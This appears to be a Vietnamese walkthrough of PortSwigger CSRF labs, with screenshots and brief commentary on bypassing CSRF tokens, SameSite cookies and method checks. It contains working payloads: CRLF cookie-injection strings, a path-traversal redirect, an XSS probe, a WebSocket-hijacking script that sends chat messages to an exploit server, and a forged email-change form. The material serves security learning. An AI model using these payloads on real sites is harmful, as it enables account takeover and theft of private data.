![image](https://github.com/user-attachments/assets/b53f2c58-5001-4bde-8bf8-895fcae4a42d)

Đây là req khi tôi đổi email với user là wiener 

![image](https://github.com/user-attachments/assets/8cb3e453-f5a5-42e5-9579-d36b7d93b2ac)

Tạo 1 cái CSRF PoC:

![image](https://github.com/user-attachments/assets/5e366c9f-17c4-42fe-8868-1d9d165a931e)

Đưa vào trong exploit là xong

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/bc064f7a-63e0-4a21-b6e3-b6a30662835d)

Đây là req của thay đổi email và có cả cái token csrf:

![image](https://github.com/user-attachments/assets/73044eac-8b76-4f79-af3f-5a6a992cde8a)

Token sai là không cho đổi mail:

![image](https://github.com/user-attachments/assets/0b747f5d-6779-47fb-b7e6-ee8748f12f55)

Cơ mà đề bài có nhắc đến thể loại req nên tôi thử chuyển sang GET, ném cái tham số email lên trên và gửi được req:

![image](https://github.com/user-attachments/assets/9e72c5e2-b7c0-4fe0-9549-745b72f617d2)

![image](https://github.com/user-attachments/assets/5b83260c-f62a-4063-a926-a40c3d231ff8)

Ném vào exploit là xong

![image](https://github.com/user-attachments/assets/6c3a014a-f132-4339-a23c-f906256a297a)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/61e688d4-2546-4dfe-b7cb-2c3e56e92847)

Đây là req để đổi email:

![image](https://github.com/user-attachments/assets/46d48cbb-1d30-4b12-bf83-fe8e152dd2e0)

Tôi thử xóa hẳn cái token csrf đi và vẫn đổi được mail:

![image](https://github.com/user-attachments/assets/c25009bc-ae65-4e2e-abbc-7042cba93412)

Vậy là chỉ cần xóa token và đưa vào là xong

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/f724bab4-0487-456e-bb3d-6b799233dc41)

Sau 1 lúc thử, mỗi lần đổi email là đổi token csrf, không dùng lại được, không xóa đi được

![image](https://github.com/user-attachments/assets/ba5c9cf7-6f2e-4ce8-ad74-0548b05b9d99)

Bật f12 lên thì thấy có giá trị của token csrf, nếu đổi email là sẽ dùng cái token đấy, thử tiếp thì tôi thấy cái token không phân biệt các user khác nhau:

![image](https://github.com/user-attachments/assets/4ccd32c2-1464-4c39-bf66-6185f86f5c78)

Tạo cái CSRF PoC rồi đổi token và email là xong

![image](https://github.com/user-attachments/assets/f79c4b21-6d71-4321-b8c1-195b2c8c217a)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/a2777793-6922-41f1-bd65-868b7ff7c599)

Lần này trong cookie có hẳn cái csrfkey 

![image](https://github.com/user-attachments/assets/bfcabbde-b26b-42f0-ba63-afb4e90bfdea)

Tôi thử đổi riêng các token csrf hoặc csrfkey giữa 2 tài khoản thì không có được, xóa cũng không được, nhưng nếu đổi cả token lẫn csrfkey thì lại được:

![image](https://github.com/user-attachments/assets/517178eb-fac4-432a-a854-42a37332b8dd)

Vấn đề là làm sao để có thể lấy được token của nạn nhân hoặc là đưa cái token của mình vào? Để ý cái tính năng search của bài, khi search thì cái req có chứa cái cookie:

![image](https://github.com/user-attachments/assets/690604b0-eb66-4faa-a967-92d23c051aee)

![image](https://github.com/user-attachments/assets/64f572fc-727b-4c16-abe6-ed64552d54ca)

![image](https://github.com/user-attachments/assets/df2f8dbe-7682-4898-a254-5e5fd1ab3c6d)

Với cái này thì dùng loại inject vào trong cái header với payload `?search=lmao%3b%0d%0aSet-Cookie:%20csrfKey=TDJV7g1KMSCZg0S1ZQodg0quVFdxzfiL`, trong đây có đưa con trỏ về đầu bằng %0d và xuống dòng với %0a, cái này để set cái csrfkey cookie của nạn nhân thành giống với cái của wiener:

![image](https://github.com/user-attachments/assets/69444495-b94d-4f4a-b8b6-e7274a97ba28)

Tạo cái csrf PoC và sửa thành như này:

![image](https://github.com/user-attachments/assets/f473df5f-c9bb-477f-b2a1-46137f84e761)

![image](https://github.com/user-attachments/assets/ed3ab3a7-c26e-45b1-a9cd-8fac9ad6ff24)

Sau khi thử thì không thấy nó solve, tôi sửa payload là thành như này, giữ lại `Secure; HttpOnly` và thêm `SameSite=None` là một thuộc tính trong cookie giúp kiểm soát cách trình duyệt gửi cookie khi có yêu cầu từ trang web khác

![image](https://github.com/user-attachments/assets/6f2f1e29-5594-43e4-9f9a-dc123201cc01)

![image](https://github.com/user-attachments/assets/b088b0a4-3898-40c1-a632-23d3ccd20cbd)

Đại khái thì payload này sẽ đổi cookie của nạn nhân, cụ thể là csrfkey và token csrf, sau đó tự động đổi email

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/0b746cb3-cdbc-4e4c-8939-93fa6b281ed2)

Lần này thì token csrf lặp lại cả ở cookie:

![image](https://github.com/user-attachments/assets/ee4270bc-0be7-4d18-be07-454a5b060440)

Tôi dùng tính năng search và inject payload `search=lmao%3b+Secure%3b+HttpOnly%0d%0aSet-Cookie:csrf=8XBVDtGcrz1QayzohITrrK3XldjZXM0x%3b+SameSite=None` vào trong header:

![image](https://github.com/user-attachments/assets/a7181868-1e8f-4aca-8265-0ee1b96c1986)

Và đây là payload, chức năng payload này khá giống bài trước:

![image](https://github.com/user-attachments/assets/8b4dddb5-e402-4616-a96c-6d5e65114842)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/807776ad-8e2e-4c6d-8cdb-dfa8f8184e1f)

Đây là req đổi email thông qua tài khoản wiener:

![image](https://github.com/user-attachments/assets/d0a3e177-cd84-4b86-b31e-bd7c8d55dff3)

Thử dùng csrf PoC mà không được:

![image](https://github.com/user-attachments/assets/0d659fff-b852-49be-b9ae-00a626d76b43)

Tôi thử đổi method sang GET nhưng vẫn không được:

![image](https://github.com/user-attachments/assets/ce37f2d9-fbb3-4661-b6f3-7b367379b4d8)

Tôi tìm được cái `_method` để ghi đè method: 

![image](https://github.com/user-attachments/assets/aab1e973-08db-4fe7-bc43-84d7f3df7fd8)

Tôi đổi method thành GET, lấy csrf PoC và thêm `<input type="hidden" name="_method" value="POST" />`:

![image](https://github.com/user-attachments/assets/f25ff017-7e17-405c-aacf-77177f9d105a)

![image](https://github.com/user-attachments/assets/68698acd-f709-4a7c-aa29-0c1e6499bc6a)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/579ea7c9-232d-4cd8-b4f6-90142f01a0a0)

Bài này có thêm cái submit=1, khi đổi giá trị của submit hoặc xóa đi thì sẽ thông báo "Parameter 'submit' is invalid":

![image](https://github.com/user-attachments/assets/37396d04-5a79-4cfb-bc5e-2ebdf00e6684)

![image](https://github.com/user-attachments/assets/e5047841-7363-4536-860b-acf243a4d007)

Tạo 1 cái csrf PoC để exploit thử:

![image](https://github.com/user-attachments/assets/ff78d8b1-5e1e-4201-9bb2-e33d49b67c0e)

Đang bí thì tôi đọc lại đề và check lại, ở phần response của req /login có cái SameSite=Strict cái này là cookie chỉ được gửi khi người dùng truy cập trang web trực tiếp (nhập URL, bấm bookmark, hoặc điều hướng nội bộ), cookie không được gửi nếu người dùng đến từ một trang web khác (ví dụ: bấm vào liên kết từ Facebook, Google)

![image](https://github.com/user-attachments/assets/673fe95b-e5f3-43a9-a6b3-cddbfac37c7f)

Nếu để ý thì khi vào 1 bài post bất kì và comment, sau 1 lúc nó sẽ tự động đưa tôi về cái bài post đấy

![image](https://github.com/user-attachments/assets/45c4d76d-60fc-44ef-9101-4ca7ad522a73)

Để lý giải cho việc này thì do cái req `/resources/js/commentConfirmationRedirect.js` đã đưa tôi quay lại cái post đấy sau 3s:

![image](https://github.com/user-attachments/assets/08258669-9bed-48c4-89d3-e2ea4405fdb6)

Và cái param postId này nằm ở vị trí khá là nguy hiểm, nó lấy hẳn cái postId làm đường dẫn đến, nếu vậy thì thêm .. có thể quay ngược lại trang cũ:

![image](https://github.com/user-attachments/assets/07b7a659-29a8-4844-8c39-6c6429b6cd2e)

Để thử xem cái param này nằm đúng chỗ không nên tôi thử đưa `postId=3/../../../../my-account` vào và nó đã được chuyển ra my-account:

![image](https://github.com/user-attachments/assets/4abf6af2-ed79-4f5b-a13e-8a0610e43193)

Thật vậy, để khẳng định chắc nịch lại lần nữa thì tôi dùng `/post/comment/confirmation?postId=3/../../../../my-account/change-email?email=abced%40gmail.com%26submit=1` để xem thử:

![image](https://github.com/user-attachments/assets/006045d7-975c-43f8-a0af-94ca05099939)

Tạo 1 cái csrf PoC:

![image](https://github.com/user-attachments/assets/387d727a-3692-43b9-ba2d-7ae0dc72ea2b)

Đưa vào exploit:

![image](https://github.com/user-attachments/assets/5c5ad63f-d971-47bf-abbd-d8298abe02d3)

Tôi bị nhầm, do để dấu & trong cái request nên nó tưởng đấy là param submit riêng, phải chỉnh sửa lại một chút cho cái submit để vào chung thì mới được:

![image](https://github.com/user-attachments/assets/4c84a056-f732-4a2b-80fc-a440771ad473)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/e27f88b4-866b-468e-b2b0-5b45b628b7b8)

Đây là phần livechat:

![image](https://github.com/user-attachments/assets/9aeba0de-2cd1-487e-82a3-ad81ea681092)

Tôi bật intercept lên và nhập payload `<img src=lmao onerror='alert(1)'>` vào, xảy ra xss:

![image](https://github.com/user-attachments/assets/09cca0fd-cb89-4916-b9e2-d236fd7d732e)

![image](https://github.com/user-attachments/assets/5d58e331-face-46da-8f4a-3b250488ddc8)

Để lấy được lịch sử cuộc trò chuyện thì phải cần có cookie và gửi READY, cái mà xác nhận đã kết nối vào:

![image](https://github.com/user-attachments/assets/88e4a4c9-685d-4deb-8593-76d27226c7d6)

Tôi nghĩ tôi sẽ lấy cookie của các user khác:

![image](https://github.com/user-attachments/assets/039ea87c-c5eb-488f-90d6-d8c1c026d035)

Đợi 1 lúc thì không thấy cookie nào cả

![image](https://github.com/user-attachments/assets/7bcda690-b8c7-40e5-88f4-80b16f31f630)

Để ý thì ở phần cookie có SameSite=Strict, là một giá trị của thuộc tính SameSite trong cookie, giúp kiểm soát cách trình duyệt gửi cookie trong các yêu cầu cross-site

![image](https://github.com/user-attachments/assets/e41b754c-4979-4acf-bd5f-8b6c87012edd)

```
<script>
var webSocket = new WebSocket("wss://0a2c002b03262a4c810e1bc900a60045.web-security-academy.net/chat");

webSocket.onopen = function (evt) {
webSocket.send("READY")
};

webSocket.onmessage = function (evt) {
var message = evt.data;
fetch("https://exploit-0a9a00e003622a2481f01afc01f600cf.exploit-server.net/exploit?message=" + btoa(message)
);
};
</script>
```

Tôi chèn vào server exploit đoạn này, đầu tiên là khởi tạo WebSocket, sau đó là gửi READY, mỗi khi WebSocket nhận được tin nhắn (onmessage), nội dung tin nhắn (evt.data) được lưu vào biến message và cuối cùng là gửi về server exploit

![image](https://github.com/user-attachments/assets/2cca7428-a396-4151-b089-dbe84005e561)

Check access log thì có đoạn message được encode base64

![image](https://github.com/user-attachments/assets/73b06d86-a9f6-4927-843f-456baa52871c)

Nếu để ý phần response của /resources/js/chat.js thì có Access-Control-Allow-Origin nên xss để lấy cookie là điều không thể:

![image](https://github.com/user-attachments/assets/aed8f69e-b776-42f0-a93c-f74021bb94d9)

Nếu đi theo đường link này thì sẽ có 1 cái chỗ để login 

![image](https://github.com/user-attachments/assets/0c250d22-2c1d-4507-9ecc-58263504b08f)

Và phần username bị dính xss sau khi tôi dùng `<script>alert(window.origin)</script>`:

![image](https://github.com/user-attachments/assets/7755a48d-e7b8-406a-adb0-258db8b4e2cf)

Tôi encode url cái mà tôi vừa để trên exploit lại, sau đó đưa vào username 

![image](https://github.com/user-attachments/assets/b9f5ba9e-83ef-4598-811e-d984964f80f5)

![image](https://github.com/user-attachments/assets/1f0701c6-fab0-45be-b1b8-6a5b785212f7)

Chuyển sang method GET thì vẫn gửi được

![image](https://github.com/user-attachments/assets/a23378e3-9610-445b-aac9-edbf528a9e76)

Làm cái document.location và để đường dẫn kia vào 

![image](https://github.com/user-attachments/assets/5f84a31e-1f6f-4144-8496-d8da7d7a4cd6)

Ấn gửi và vào access log để xem:

![image](https://github.com/user-attachments/assets/4ac5015f-7e3b-4c97-8c77-bac972c5465a)

Và mấy cái base64 sau khi decode ra thì là 1 số đoạn của chat:

![image](https://github.com/user-attachments/assets/d72e5688-d0f9-4c00-9921-0e517f78cf5b)

Và trong đoạn chat có chứa password của carlos

![image](https://github.com/user-attachments/assets/837163ef-eb7b-413a-aa65-2f6497f660b0)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/81f6dff7-cc8a-4825-aa42-7810727f66ac)

Tôi tạo thử 1 cái PoC để cho vào exploit:

![image](https://github.com/user-attachments/assets/2afe320d-1e40-48cf-8970-97db33f1b7ef)

Sau khi tôi ấn view thì nó dẫn đến cái này:

![image](https://github.com/user-attachments/assets/55b8a11f-8051-4847-9187-7c1a83fbc761)

Và email vẫn chưa được đổi vì nó đi qua /social-login:

![image](https://github.com/user-attachments/assets/a68456a5-6eb1-4062-a3a4-5989119e2007)

Sau đó chuyển sang oauth-callback và làm cái cookie mới:

![image](https://github.com/user-attachments/assets/396e3360-934a-42cf-9780-3e97daecbd88)

Vậy vấn đề ở đây là tôi phải mở 1 cửa sổ khác đợi cho nó nhảy vào /social-login để lấy cookie mới và đổi mail
```
<form method="POST" action="https://0ad400e703526ffc82be294a006e000b.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="lmao512555@gmail.com">
</form>
<p>Click to change email</p>
<script>
    window.onclick = () => {
        window.open('https://0ad400e703526ffc82be294a006e000b.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

Thì đoạn code này sẽ có 1 cái trang, người dùng ấn vào thì sẽ dẫn 1 cửa sổ mới đến /social-login, còn cửa sổ cũ đợi và đổi email

![image](https://github.com/user-attachments/assets/609c5f81-b399-4ca9-9450-180ea270a694)







































